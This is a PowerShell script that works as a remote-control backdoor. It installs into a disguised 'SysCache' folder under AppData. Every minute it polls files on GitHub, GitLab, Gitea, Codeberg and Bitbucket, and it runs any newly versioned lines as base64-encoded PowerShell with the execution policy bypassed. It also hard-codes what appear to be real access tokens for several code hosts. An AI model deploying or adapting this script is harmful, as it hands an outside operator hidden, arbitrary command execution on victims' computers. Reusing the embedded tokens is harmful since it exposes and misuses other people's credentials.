# Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

############################
# CONFIG
############################
$INTERVAL = 59
$CMD_TIMEOUT = 60
$CURL_TIMEOUT = 30
$BASE_DIR = "$env:USERPROFILE\AppData\Local\SysCache"
$STATE_DIR = Join-Path $BASE_DIR "state"
$LOG_DIR = Join-Path $BASE_DIR "logs"
$CONFIG_ABC = Join-Path $BASE_DIR ".uniq_name"

# Folders जरूर बनाओ
New-Item -ItemType Directory -Force -Path $BASE_DIR, $STATE_DIR, $LOG_DIR | Out-Null
Set-Location $BASE_DIR

# Log file में start message
 "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | SCRIPT STARTED" | Out-File "$LOG_DIR\executions.log" -Append -Encoding UTF8

$FILE = ""
$maxRetry = 3
$retry = 0
while ($retry -le $maxRetry) {
    if (Test-Path $CONFIG_ABC) {
        $FILE = (Get-Content $CONFIG_ABC -First 1 -ErrorAction SilentlyContinue).Trim()
        if ($FILE) { break }
    }
    Start-Sleep -Seconds 5
    $retry++
}
if (-not $FILE) { $FILE = "test.txt" }
Write-Host "Using file: $FILE"
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | Using file: $FILE" | Out-File "$LOG_DIR\executions.log" -Append -Encoding UTF8

############################
# TOKENS
############################
$GITHUB_TOKEN="aa"
$GITHUB_OWNER="mahesh97m"
$GITHUB_REPO="phpcode"

$GITLAB_TOKEN="glpat-DClozHjP9aOyT4xotnJs8286MQp1OmpleGs4Cw.01.120o1vpv7"
$GITLAB_PROJECT_ID="77391265"
$GITLAB_OWNER="mahesh2210m"
$GITLAB_REPO="mahesh2210m"

$BRANCH="main"

$GITEA_TOKEN="ad7ecc45d4f3f1421f62649d755df8b61a3f3c22"
$GITEA_OWNER="mahesh2210m"
$GITEA_REPO="mahesh2210m"

$CODEBERG_TOKEN="633d815048d96c111edb94f71b75eb152d83d13a"
$CODEBERG_OWNER="mahesh2210m"
$CODEBERG_REPO="mahesh2210m"

$BITBUCKET_TOKEN="ATCTT3xFfGN0OfF9SvlcZ2obggrqfCavTxQPw74JL2N1eWO6IeblaWQJ51Dy21DniuZWhwRmk4x_sKaVg11x3Sx_BMR7dpyZbYcknW7I3d1Gvhn2QXOd12z54PXDAg6RQ04GTEOeK_sQ_MoKxdrccqwpWy4cWsYhEtreA7Vpcgja4ISA6d77QL4=262DE832"
$BITBUCKET_WORKSPACE="mahesh2210m"
$BITBUCKET_REPO="mahesh2210m"

############################
# LOGGING
############################
function Log-Exec($msg) {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | $msg" | Out-File "$LOG_DIR\executions.log" -Append -Encoding UTF8
}
function Log-Err($msg) {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | ERROR | $msg" | Out-File "$LOG_DIR\errors.log" -Append -Encoding UTF8
}

############################
# RUN-CMD (अब बिल्कुल सही है - PS| CM| support + Timeout)
############################
############################
# RUN-CMD (अब 100% reliable - Base64 EncodedCommand से)
############################
function Run-Cmd {
    param([string]$Cmd)
    $originalCmd = $Cmd.Trim()

    # Prefix handling
    if ($originalCmd -like "CM|*" -or $originalCmd -like "CMD:*") {
        $realCmd = $originalCmd.Substring(3).Trim()
        $realCmd = "cmd /c `"$realCmd`""
    }
    elseif ($originalCmd -like "PS|*" -or $originalCmd -like "PS:*") {
        $realCmd = $originalCmd.Substring(3).Trim()
    }
    else {
        $realCmd = $originalCmd
    }

    Log-Exec "EXECUTING: $originalCmd → PowerShell -EncodedCommand"

    try {
        # Base64 encoding to avoid any quoting/escaping issues
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($realCmd)
        $encodedCmd = [Convert]::ToBase64String($bytes)

        $process = Start-Process -FilePath "powershell.exe" `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCmd" `
            -NoNewWindow -PassThru `
            -RedirectStandardOutput "$env:TEMP\out.txt" `
            -RedirectStandardError "$env:TEMP\err.txt"

        if ($process.WaitForExit($CMD_TIMEOUT * 1000)) {
            $output = Get-Content "$env:TEMP\out.txt" -Raw -ErrorAction SilentlyContinue
            $errorOutput = Get-Content "$env:TEMP\err.txt" -Raw -ErrorAction SilentlyContinue
            $exitCode = $process.ExitCode

            if ($output) { $output.Trim() -split "`n" | ForEach-Object { Log-Exec "OUT: $_" } }
            if ($errorOutput) { $errorOutput.Trim() -split "`n" | ForEach-Object { Log-Err "ERR: $_" } }

            if ($exitCode -eq 0) {
                Log-Exec "SUCCESS"
                return $true
            } else {
                Log-Err "FAILED (ExitCode: $exitCode)"
                return $false
            }
        } else {
            Stop-Process $process -Force -ErrorAction SilentlyContinue
            Log-Err "TIMEOUT after $CMD_TIMEOUT seconds"
            return $false
        }
    }
    catch {
        Log-Err "EXCEPTION: $_"
        return $false
    }
    finally {
        Remove-Item "$env:TEMP\out.txt", "$env:TEMP\err.txt" -ErrorAction SilentlyContinue
    }
}
############################
# SAFE FETCH
############################
function Safe-Fetch {
    param([string]$Url, [hashtable]$Headers)
    try {
        $resp = Invoke-WebRequest -Uri $Url -Headers $Headers -TimeoutSec $CURL_TIMEOUT -UseBasicParsing
        return $resp.Content
    } catch {
        Log-Err "Fetch failed: $Url - $($_.Exception.Message)"
        return $null
    }
}

# Fetchers (URLs में <> हटा दिए)
function Fetch-GitHub { 
    $RawUrl = "https://raw.githubusercontent.com/$GITHUB_OWNER/$GITHUB_REPO/$BRANCH/$FILE"
    Safe-Fetch $RawUrl @{} 
}
#function Fetch-GitHub { Safe-Fetch "https://api.github.com/repos/$GITHUB_OWNER/$GITHUB_REPO/contents/$FILE" @{ Authorization="token $GITHUB_TOKEN"; Accept="application/vnd.github.v3.raw" } }
function Fetch-GitLab {
    Safe-Fetch "https://gitlab.com/$GITLAB_OWNER/$GITLAB_REPO/-/raw/$BRANCH/$FILE"
}

#function Fetch-GitLab { Safe-Fetch "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$FILE/raw?ref=$BRANCH" @{ "PRIVATE-TOKEN"=$GITLAB_TOKEN } }
function Fetch-Gitea { Safe-Fetch "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/raw/$BRANCH/$FILE" @{ Authorization="token $GITEA_TOKEN" } }
#function Fetch-Bitbucket { Safe-Fetch "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src/$BRANCH/$FILE" @{ Authorization="Bearer $BITBUCKET_TOKEN" } }
# Naya Bitbucket Function (Bina Token wala - Public Repo ke liye)
function Fetch-Bitbucket { 
    $RawUrl = "https://bitbucket.org/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/raw/$BRANCH/$FILE"
    Safe-Fetch $RawUrl @{} 
}
function Fetch-Codeberg {
    $RawUrl = "https://codeberg.org/$CODEBERG_OWNER/$CODEBERG_REPO/raw/branch/$BRANCH/$FILE"
    Safe-Fetch $RawUrl @{}
}

############################
# VERSION
############################
function Version-Greater($A, $B) {
    try { return ([Version]$A -gt [Version]$B) } catch { return $false }
}

############################
# MAIN LOOP
############################
while ($true) {
    foreach ($SRC in "github","gitlab","gitea","codeberg","bitbucket") {
        switch ($SRC) {
            "github" { $CONTENT = Fetch-GitHub }
            "gitlab" { $CONTENT = Fetch-GitLab }
            "gitea" { $CONTENT = Fetch-Gitea }
            "codeberg" { $CONTENT = Fetch-Codeberg }
            "bitbucket" { $CONTENT = Fetch-Bitbucket }
            
        }
        if (-not $CONTENT) { continue }

        $LAST_FILE = "$STATE_DIR\${SRC}_last_version.txt"
        if (-not (Test-Path $LAST_FILE)) { "" | Set-Content $LAST_FILE }
        $LAST_VERSION = (Get-Content $LAST_FILE -ErrorAction SilentlyContinue).Trim()

        $CURRENT_VERSION = ($CONTENT -split "`n" | Where-Object { $_ -match '^[0-9]+(\.[0-9]+)*$' } | Select-Object -Last 1).Trim()
        if (-not $CURRENT_VERSION) { continue }

        if ($LAST_VERSION -eq "" -or (Version-Greater $CURRENT_VERSION $LAST_VERSION)) {
            Log-Exec "SRC=$SRC | NEW VERSION: $CURRENT_VERSION → EXECUTING COMMANDS"

            $lines = $CONTENT -split "`n"
            $run = $false
            foreach ($line in $lines) {
                $cmd = $line.Trim()
                if ($cmd -eq $CURRENT_VERSION) { $run = $true; continue }
                if ($run -and $cmd -match '^[0-9]+(\.[0-9]+)*$') { break }
                if ($run -and $cmd) {
                    Run-Cmd $cmd
                }
            }
            $CURRENT_VERSION | Set-Content $LAST_FILE
            Log-Exec "SRC=$SRC | Version updated to $CURRENT_VERSION"
        }
    }
    Start-Sleep -Seconds $INTERVAL
}
